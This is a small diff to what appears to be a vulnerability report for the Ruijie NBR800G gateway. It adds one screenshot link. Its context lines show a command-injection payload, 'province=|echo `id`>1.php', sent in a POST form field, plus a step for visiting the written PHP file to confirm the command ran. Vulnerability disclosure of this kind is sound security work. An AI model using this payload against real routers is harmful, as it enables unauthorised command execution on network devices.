@@ -42,6 +42,7 @@ Ruijie NBR800G gateway NBR_RGOS_11.1(6)B4P9
 <br />Content-Type: application/x-www-form-urlencoded
 <br />Content-Length: 25
 <br />province=|echo `id`>1.php
+<br />![image](https://github.com/user-attachments/assets/ae773394-a255-4630-8acb-1fc63df9fa2b)
 <br />Visit /itbox_pi/1.php and execute id
 <br />![image](https://github.com/user-attachments/assets/c0b68ba4-dc31-4c0a-a1ad-95556b511fbd)
 <br />To facilitate review and retest, a real case verification is provided.
